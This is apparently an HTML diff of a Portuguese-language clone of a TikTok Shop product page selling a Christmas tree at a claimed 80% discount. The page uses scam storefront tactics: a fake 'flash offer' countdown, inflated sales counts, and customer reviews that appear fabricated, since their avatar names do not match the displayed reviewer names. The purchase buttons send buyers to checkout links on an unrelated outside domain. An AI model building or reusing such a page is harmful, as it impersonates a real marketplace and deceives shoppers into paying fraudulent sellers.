*/*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.container{width:100%}@media (min-width: 640px){.container{max-width:640px}}@media (min-width: 768px){.container{max-width:768px}}@media (min-width: 1024px){.container{max-width:1024px}}@media (min-width: 1280px){.container{max-width:1280px}}@media (min-width: 1536px){.container{max-width:1536px}}.mx-auto{margin-left:auto;margin-right:auto}.ml-3{margin-left:0.75rem}.mt-10{margin-top:2.5rem}.flex{display:flex}.h-9{height:2.25rem}.h-12{height:3rem}.w-full{width:100%}.w-12{width:3rem}.max-w-md{max-width:28rem}.flex-1{flex:1 1 0%}.items-center{align-items:center}.justify-between{justify-content:space-between}.rounded-xl{border-radius:0.75rem}.rounded{border-radius:0.25rem}.rounded-full{border-radius:9999px}.border{border-width:1px}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.p-4{padding:1rem}.px-3{padding-left:0.75rem;padding-right:0.75rem}.px-4{padding-left:1rem;padding-right:1rem}.py-1{padding-top:0.25rem;padding-bottom:0.25rem}.text-left{text-align:left}.text-2xl{font-size:1.5rem;line-height:2rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.font-semibold{font-weight:600}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.transition{transition-property:color, background-color, border-color, fill, stroke, opacity, box-shadow, transform, filter, -webkit-text-decoration-color, -webkit-backdrop-filter;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter, -webkit-text-decoration-color, -webkit-backdrop-filter;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hover\:bg-gray-200:hover{--tw-bg-opacity:1;background-color:rgb(229 231 235 / var(--tw-bg-opacity, 1))}</style><script src="chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/kins_stabilizer.js"></script><style>
+            @keyframes slideDown {
+                from { transform: translate(-50%, -20px); opacity: 0; }
+                to { transform: translate(-50%, 0); opacity: 1; }
+            }
+            
+            @keyframes slideUp {
+                from { transform: translate(-50%, 0); opacity: 1; }
+                to { transform: translate(-50%, -20px); opacity: 0; }
+            }
+            
+            @keyframes buttonPress {
+                0% { transform: scale(1); }
+                50% { transform: scale(0.95); }
+                100% { transform: scale(1); }
+            }
+            
+            .button-pressed {
+                animation: buttonPress 0.2s ease-out;
+            }
+        </style></head>
+
+<body cz-shortcut-listen="true" class="modal-open">
+    <div class="container">
+        <!-- Header -->
+        <header id="main-header" class="header">
+            <div class="header-left"></div>
+            <a href="http://127.0.0.1:5500/tiktok.shop/index.html?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=" class="text-2xl" aria-label="Voltar para a página inicial" id="a2f58b19-8be2-dd48-e09f-86b9e2cf3c79">‹</a>
+            <div class="flex-1">
+  <button id="search-btn" class="bg-gray-100 rounded-xl h-9 flex items-center px-3 text-gray-400 text-sm w-full text-left" type="button" aria-label="Pesquisar">
+    Pesquisar
+  </button>
+</div>
+
+
+        
+            <div class="header-right" style="font-size: 21px; margin-left: 21px;">
+    <button onclick="handleOpenShareSection()" id="416440cd-e48f-c4ef-238c-cf3dce8f1d94">
+    <img src="images/compartilhar.png" alt="Compartilhar" width="20" height="20">
+</button>
+    <a href="http://127.0.0.1:5500/tiktok.shop/carrinho/index.html?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=" style="position: relative; text-decoration: none; color: inherit;" id="6b17c1dd-95e7-f871-fad3-0fb21afad7e5">
+        🛒
+        <span id="cart-count-header" style="
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: #ff2d55;
+            color: white;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+        ">0</span>
+    </a>
+    <button onclick="handleOpenComplaintSection()" id="efad8a43-2f17-3da8-56da-d58ac5a8ddf8">⋯</button>
+</div>
+        </header><div id="sticky-tabs" class="tabs" style="display: none; position: sticky; top: 57px; z-index: 99; background: white; border-bottom: 1px solid rgb(240, 240, 240);">
+            <div class="tab active" onclick="scrollToVisaoGeral()">Visão geral</div>
+            <div class="tab" onclick="scrollToAvaliacoes()">Avaliações</div>
+            <div class="tab" onclick="scrollToDescription()">Descrição</div>
+            <div class="tab" onclick="scrollToRecomendacoes()">Recomendações</div>
+        </div>
+        <!-- Product Images -->
+        <section id="visao-geral-section" class="product-images">
+            <div class="image-container">
+                <img alt="Kit 262 Canetinhas Coloridas" class="product-main-image" id="main-product-image" src="imagens/01.jpg">
+                <div class="image-loading" id="image-loading">Carregando...</div>
+                <div class="image-counter" id="image-counter">1/5</div>
+               <div class="swipe-indicator left">←</div>
+    <div class="swipe-indicator right">→</div>
+</div>
+            
+            <div class="image-dots" id="image-dots">
+                <!-- Pontos indicadores serão gerados pelo JavaScript -->
+            <div class="dot active"></div><div class="dot "></div><div class="dot "></div><div class="dot "></div><div class="dot "></div></div>
+            <div class="image-thumbnails" id="image-thumbnails">
+                <!-- Thumbnails serão gerados pelo JavaScript -->
+            </div>
+        </section>
+        <!-- Price Section -->
+<!-- New Clean Price Section -->
+<section class="clean-price-section" style="padding: 12px 16px 8px 16px; background: white;">
+    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
+        <span style="background: #ff2d55; color: white; padding: 2px 6px; border-radius: 4px; font-size: 12px; font-weight: 600;">-80,24%</span>
+        <span style="font-family: 'TikTokDisplayFont', sans-serif; font-size: 24px; font-weight: 700; color: #ff2d55;">R$ 69,90</span>
+        <span style="text-decoration: line-through; color: #999; font-size: 14px;">R$ 468,95</span>
+    </div>
+    
+    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 0;">
+        <div style="display: flex; align-items: center; background: #fff8f8; padding: 3px 8px; border-radius: 12px;">
+            <svg fill="#ff2d55" height="14" viewBox="0 0 24 24" width="14">
+                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
+            </svg>
+            <span style="color: #ff2d55; font-size: 12px; font-weight: 600; margin-left: 4px;">Oferta Relâmpago</span>
+        </div>
+        <span id="countdown-timer" style="color:#ff2d55;font-size:14px;font-weight:600;">Termina em 17:05</span>
+
+    </div>
+</section>
+
+<section class="product-info" style="padding: 4px 16px 2px 16px;">
+    <div style="display: flex; justify-content: space-between; align-items: flex-start; gap: 12px;">
+        <h1 class="product-title" style="flex: 1; font-size: 16px; margin: 0; line-height: 1.2;">ÁRVORE DE NATAL LUXO 180CM DECORADA COM LUZES + 2 BORBOLETAS</h1>
+        <button id="save-button" style="background: none; border: none; cursor: pointer; padding: 4px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: all 0.2s ease;" onclick="toggleSave()">
+            <svg id="save-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 21.35L10.55 20.03C5.4 15.36 2 12.28 2 8.5C2 5.42 4.42 3 7.5 3C9.24 3 10.91 3.81 12 5.09C13.09 3.81 14.76 3 16.5 3C19.58 3 22 5.42 22 8.5C22 12.28 18.6 15.36 13.45 20.04L12 21.35Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+            </svg>
+        </button>
+    </div>
+    <div class="rating-section" style="margin-top: 2px;">
+    <span class="stars">
+        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107" style="width: 18px; height: 18px;">
+    <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+</svg>
+    </span>
+    <span class="rating-text" style="font-size: 12px; color: #888;">4.7 (204) 4473 vendidos</span>
+</div>
+</section>
+        <!-- Shipping Info -->
+      <section class="shipping-info" style="padding: 8px 0;">
+    <div class="shipping-row" style="padding: 8px 16px;">
+        <svg class="shipping-icon" fill="none" height="18" viewBox="0 0 24 24" width="18" stroke="#000" stroke-width="2" style="transform: scale(0.9);">
+            <path d="M16 3H3V17H16V3Z" stroke-linecap="round" stroke-linejoin="round"></path>
+            <path d="M16 7H20V13H16V7Z" stroke-linecap="round" stroke-linejoin="round"></path>
+            <path d="M19 13V17H16V13" stroke-linecap="round" stroke-linejoin="round"></path>
+            <path d="M8 17H4" stroke-linecap="round" stroke-linejoin="round"></path>
+            <path d="M20 17H16" stroke-linecap="round" stroke-linejoin="round"></path>
+            <circle cx="6.5" cy="17.5" r="1.5" fill="currentColor"></circle>
+            <circle cx="17.5" cy="17.5" r="1.5" fill="currentColor"></circle>
+        </svg>
+        <div class="shipping-details">
+            <div class="shipping-date" id="shipping-date" style="color: #000; font-size: 12px; margin-bottom: 1px;">Receba até 3 de dez.</div>
+            <div class="shipping-fee" style="color: #999; font-size: 11px; text-decoration: line-through;">Taxa de envio: R$ 20,90</div>
+        </div>
+        <span style="color: #000;"></span>
+    </div>
+    
+    <div style="height: 1px; background-color: #f0f0f0; margin: 4px 0; width: 100%;"></div>
+    
+    <div class="shipping-row" style="padding: 8px 16px;">
+        <svg class="shipping-icon" fill="none" height="16" viewBox="0 0 24 24" width="16" style="transform: scale(0.85);">
+            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#000" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+            <path d="M9 12L11 14L15 10" stroke="#000" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+        </svg>
+        <div class="shipping-details">
+            <div style="color: #000; font-size: 12px; line-height: 1.2;">Devoluções gratuitas em 30 dias • Cancelamento fácil</div>
+        </div>
+        <span style="color: #000;"></span>
+    </div>
+
+
+<style>
+    .flavor-box {
+        margin-top: 12px;
+        text-align: center; /* centraliza tudo dentro */
+        width: 100%;
+    }
+
+    .flavor-label {
+        font-size: 16px;
+        font-weight: 600;
+        margin-bottom: 10px;
+    }
+
+    .flavor-list {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        justify-content: center; /* centraliza os botões */
+    }
+
+    .flavor-item {
+        padding: 8px 14px;
+        background: #f4f4f4;
+        border-radius: 10px;
+        border: 1px solid #ccc;
+        font-size: 14px;
+        cursor: pointer;
+        transition: .25s;
+        user-select: none;
+    }
+
+    .flavor-item:hover {
+        background: #e9e9e9;
+    }
+
+    .flavor-item.selected {
+        background: #FF2D55;
+        border-color: #FF2D55;
+        color: #fff;
+        font-weight: 600;
+        transform: scale(1.03);
+    }
+
+    .flavor-item.disabled {
+        background: #e3e3e3 !important;
+        color: #999 !important;
+        cursor: not-allowed !important;
+        border-color: #d1d1d1 !important;
+        opacity: .7;
+        pointer-events: none;
+    }
+</style>
+
+<script>
+    document.querySelectorAll(".flavor-item").forEach(item => {
+        item.addEventListener("click", () => {
+            if (item.classList.contains("disabled")) return;
+
+            document
+                .querySelectorAll(".flavor-item")
+                .forEach(i => i.classList.remove("selected"));
+
+            item.classList.add("selected");
+        });
+    });
+</script>
+
+
+    <hr style="margin-top: 1.5em; margin-bottom: 1.5em;">
+	<div style="margin: 20px;">
+  📦 <strong>Itens incluídos:</strong><br>
+  1X PONTEIRO ESTRELA<br>
+1X PISCA-PISCA<br>
+3X BENGALA DOCE<br>
+3X CAIXA DE PRESENTE<br>
+3X BONECOS DO PAPAI NOEL<br>
+1X LAÇO DECORATIVO<br>
+3X SINOS<br>
+3X BATERIAS DECORATIVAS<br>
+10X BOLINHAS DECORATIVAS
+</div>
+    <hr style="margin-top: 1.5em; margin-bottom: 1.5em;">
+    <div style="height: 1px; background-color: #f0f0f0; margin: 4px 0; width: 100%;"></div>
+</section>
+
+
+
+        <!-- Tabs -->
+        <div id="sticky-tabs" class="tabs" style="display: none; position: sticky; top: 57px; z-index: 99; background: white; border-bottom: 1px solid #f0f0f0;">
+            <div class="tab" onclick="scrollToVisaoGeral()">Visão geral</div>
+            <div class="tab" onclick="scrollToAvaliacoes()">Avaliações</div>
+            <div class="tab" onclick="scrollToDescription()">Descrição</div>
+            <div class="tab" onclick="scrollToRecomendacoes()">Recomendações</div>
+        </div>
+        <!-- Tab Content -->
+        <div class="content-section active" id="overview">
+            <!-- Options -->
+
+            <!-- Reviews Section -->
+            <section id="avaliacoes-section" class="reviews-section" style="padding-top: 6px;">
+    <div class="reviews-header" style="margin-bottom: 2px;">
+        <span class="reviews-title">Avaliações dos clientes (207)</span>
+    </div>
+   <div class="reviews-rating">
+    <span class="rating-big" style="font-size: 18px;">4.7</span>
+    <span style="font-size: 14px; color: #999;">/5</span>
+    <span class="stars"> 
+        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    </span>
+</div>
+                <!-- Novos depoimentos mais recentes aparecem primeiro -->
+                <div class="review-item">
+                    <div class="review-header">
+                        <div class="review-avatar">
+                            <img alt="C**l* S**t**" src="imagens/perfil1.jpg" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;">
+                        </div>
+                        <div style="display: flex; flex-direction: column;">
+                            <span class="review-name">Carla Silva</span>
+                            <span style="color: #00d4aa; font-size: 11px; font-weight: 500;">há 2 horas</span>
+                        </div>
+                    </div>
+                    <div class="review-stars">
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+</div>
+                    <div class="review-variant">Item: ÁRVORE DE NATAL LUXO 180CM DECORADA COM LUZES + 2 BORBOLETAS</div>
+                    <div class="review-text">A árvore é linda! Chegou super rápido e a qualidade me surpreendeu. Minha sala ficou muito mais bonita!</div>
+                    <div class="review-images">
+                    
+                       
+                    
+                    </div>
+                    <div class="review-item">
+                        <div class="review-header">
+                            <div class="review-avatar">
+                                <img alt="Beatriz Lima" src="imagens/perfil2.jpg" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;">
+                            </div>
+                            <div style="display: flex; flex-direction: column;">
+                                <span class="review-name">Rafaela Lima</span>
+                                <span style="color: #00d4aa; font-size: 11px; font-weight: 500;">há 6 horas</span>
+                            </div>
+                        </div>
+                        <div class="review-stars">
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+</div>
+                        <div class="review-variant">Item: ÁRVORE DE NATAL LUXO 180CM DECORADA COM LUZES + 2 BORBOLETAS</div>
+                        <div class="review-text">Comprei achando que seria simples, mas é super cheia e fácil de montar. Valeu cada centavo!</div>
+                        <div class="review-images">
+                          
+                            
+                        
+                        </div>
+                    </div>
+                    <div class="review-item">
+                        <div class="review-header">
+                            <div class="review-avatar">
+                                <img alt="Patrícia Rodrigues" src="imagens/perfil3.avif" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;">
+                            </div>
+                            <div style="display: flex; flex-direction: column;">
+                                <span class="review-name">Paula Feitosa</span>
+                                <span style="color: #00d4aa; font-size: 11px; font-weight: 500;">há 14 horas</span>
+                            </div>
+                        </div>
+                        <div class="review-stars">
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+</div>
+                        <div class="review-variant">Item: ÁRVORE DE NATAL LUXO 180CM DECORADA COM LUZES + 2 BORBOLETAS</div>
+                        <div class="review-text">Entrega rápida, produto igualzinho às fotos. Já estou no clima de Natal graças à loja!</div>
+                      
+                    <div class="review-item">
+                        <div class="review-header">
+                            <div class="review-avatar">
+                                <img alt="Ana Paula Silva" src="imagens/perfil4.webp" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;">
+                            </div>
+                            <div style="display: flex; flex-direction: column;">
+                                <span class="review-name">Pietra Santos</span>
+                                <span style="color: #00d4aa; font-size: 11px; font-weight: 500;">há 18 horas</span>
+                            </div>
+                        </div>
+                        <div class="review-stars">
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
+</div>
+                        <div class="review-variant">Item: ÁRVORE DE NATAL LUXO 180CM DECORADA COM LUZES + 2 BORBOLETAS</div>
+                        <div class="review-text">Amei demais! Os galhos são bem firmes e a árvore é volumosa. Ficou perfeita com minhas luzes.</div>
+                        <div class="review-images">
+                           
+                        </div>
+
+                   
+
+            </div></div></div></section>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav">
+            <a class="nav-item" href="index.html#" id="bf3c441d-b0db-31e2-cb5f-71fd3ccb2fe9">
+                <svg class="nav-icon" fill="none" height="20" viewBox="0 0 24 24" width="20">
+                    <path d="M3 9L12 2L21 9V20C21 20.5304 20.7893 21.0391 20.4142 21.4142C20.0391 21.7893 19.5304 22 19 22H5C4.46957 22 3.96086 21.7893 3.58579 21.4142C3.21071 21.0391 3 20.5304 3 20V9Z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+                    <path d="M9 22V12H15V22" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+                </svg>
+                <span>Loja</span>
+            </a>
+            <a class="nav-item" href="http://127.0.0.1:5500/tiktok.shop/chat/index.html?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=" id="23e19db4-30cc-18c4-b816-6814c5d1a736">
+                <svg class="nav-icon" fill="none" height="20" viewBox="0 0 24 24" width="20">
+                    <path d="M21 15C21 15.5304 20.7893 16.0391 20.4142 16.4142C20.0391 16.7893 19.5304 17 19 17H7L3 21V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H19C19.5304 3 20.0391 3.21071 20.4142 3.58579C20.7893 3.96086 21 4.46957 21 5V15Z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+                </svg>
+                <span>Chat</span>
+            </a>
+			
+			
+			
+           <!-- -- BOTÃO CHECKOUT -- -->
+
+<button class="add-cart-btn" id="add-to-cart-btn">Adicionar ao Carrinho</button>
+
+<a class="buy-btn" href="https://seguro.pediuai.store/api/public/shopify?product=1010139622399&store=10101" style="display: flex; align-items: center; justify-content: center; text-decoration: none; color: white;" id="buy-now-btn">
+    Comprar Agora
+</a>
+
+        </nav>
+
+        <div class="flavor-modal-overlay" id="flavor-modal" role="dialog" aria-modal="true" aria-hidden="false">
+            <div class="flavor-modal">
+                <button class="flavor-modal__close" type="button" aria-label="Fechar modal" id="f03d23c6-14a2-f52e-61fc-32415e4d5ca4">×</button>
+                <div class="flavor-modal__header">
+                    <img id="flavor-modal-image" src="imagens/01.jpg" alt="Produto em destaque" style="opacity: 1; transition: opacity 0.3s ease-in-out;">
+                    <div class="flavor-modal__header-info">
+                        <p class="flavor-modal__name" id="flavor-modal-name">ÁRVORE DE NATAL LUXO 180CM DECORADA COM LUZES + 2 BORBOLETAS</p>
+                        <p class="flavor-modal__price" id="flavor-modal-price">R$&nbsp;69,90</p>
+                        <span class="flavor-modal__tag">Frete expresso incluso</span>
+                    </div>
+                </div>
+                <div class="flavor-modal__sizes" role="radiogroup" aria-label="Sabores">
+                </div>
+                <p style="margin-bottom: 8px; color: #555; font-size: 14px;">Escolha a cor que deseja:</p>
+                <div class="flavor-modal__sizes" role="radiogroup" aria-label="Sabores">
+    <button type="button" class="flavor-chip" 
+        data-flavor="Luzes Brancas" 
+        data-link="https://seguro.pediuai.store/api/public/shopify?product=1010139622399&store=10101"
+        data-image="imagens/01.jpg">
+        Luzes Brancas
+    </button>
+
+    <button type="button" class="flavor-chip selected" 
+        data-flavor="Luzes Vermelhas" 
+        data-link="https://seguro.pediuai.store/api/public/shopify?product=1010123799284&store=10101"
+        data-image="imagens/vermelha.jpg">
+        Luzes Vermelhas
+    </button>
+</div>
+
+                <a href="https://seguro.pediuai.store/api/public/shopify?product=1010139622399&store=10101" id="flavor-modal-cta" class="flavor-modal__cta" target="_blank" rel="noopener noreferrer">Comprar agora - Luzes Vermelhas</a>
+            <script>
+document.querySelectorAll(".flavor-chip").forEach(button => {
+    button.addEventListener("click", function () {
+
+        // TROCAR SOMENTE A IMAGEM (SEM CLASSES, SEM ESTILO)
+        const newImage = this.getAttribute("data-image");
+        const img = document.getElementById("flavor-modal-image");
+
+        img.style.opacity = 0;
+        setTimeout(() => {
+            img.src = newImage;
+            img.style.opacity = 1;
+        }, 200);
+
+        // TROCAR LINK DO CTA
+        const cta = document.getElementById("flavor-modal-cta");
+        cta.href = this.getAttribute("data-link");
+
+        // TROCAR TEXTO DO CTA
+        cta.textContent = "Comprar agora - " + this.getAttribute("data-flavor");
+    });
+});
+</script>
+
+            </div>
+        </div>
+        
+        <div class="flex items-center justify-between border p-4 rounded w-full max-w-md mx-auto mt-10 bg-white" style="margin-top: 0; border: solid 10px #dddddd75; border-radius: 0px; border-left: 0px; border-right: 0px;">
+            <div class="flex items-center">
+               <img onclick="openFullscreen('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsEWCywnL7V9Fq2GC6aUlM4Sl1AT8p6-G5Yg&amp;s')" class="w-12 h-12 rounded-full border" alt="Logo" src="imagens/logo natal.png">
+                <div class="ml-3">
+                    <p class="font-semibold text-gray-800" style="color: #000; font-weight: 500;">Natal Shop</p>
+                    <p class="text-sm text-gray-500">18745 vendido(s)</p>
+                </div>
+            </div>
+            <button style="font-weight: 500; color: #000;" id="seguirBtn" class="bg-gray-100 text-gray-700 px-4 py-1 text-sm rounded hover:bg-gray-200 transition">
+                Seguir
+            </button>
+        </div>
+
+        <script>
+            const seguirBtn = document.getElementById('seguirBtn');
+
+            seguirBtn.addEventListener('click', () => {
+                seguirBtn.textContent = 'Seguindo';
+            });
+        </script>
+        
